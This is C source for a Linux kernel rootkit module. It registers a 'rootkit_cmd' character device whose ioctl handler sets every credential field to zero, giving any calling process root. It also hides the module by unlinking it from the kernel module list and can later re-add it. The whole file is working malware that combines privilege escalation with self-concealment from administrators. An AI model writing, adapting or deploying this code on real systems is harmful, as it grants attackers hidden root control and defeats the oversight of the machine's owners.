#include "utils.h"

void get_root(void)
{
    struct cred *cred = prepare_creds();
    if (!cred)
        return;
    cred->uid.val = 0;
    cred->gid.val = 0;
    cred->euid.val = 0;
    cred->egid.val = 0;
    cred->fsuid.val = 0;
    cred->fsgid.val = 0;
    cred->suid.val = 0;
    cred->sgid.val = 0;
    commit_creds(cred);
}

long cmd_ioctl(struct file *flip, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case GET_ROOT:
        get_root();
        break;
    case SHOW_MODULE:
        show_module();
        break;
    case HIDE_MODULE:
        hide_module();
        break;
    default:
    }

    return 0;
}

struct file_operations fops = {.unlocked_ioctl = cmd_ioctl};

void utils_init()
{
    chrdev_add("rootkit_cmd", &fops);
}

static struct list_head *head = NULL;

void hide_module(void)
{
    if (head)
        return;
    head = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void show_module(void)
{
    if (head) {
        list_add(&THIS_MODULE->list, head);
        head = NULL;
    }
}
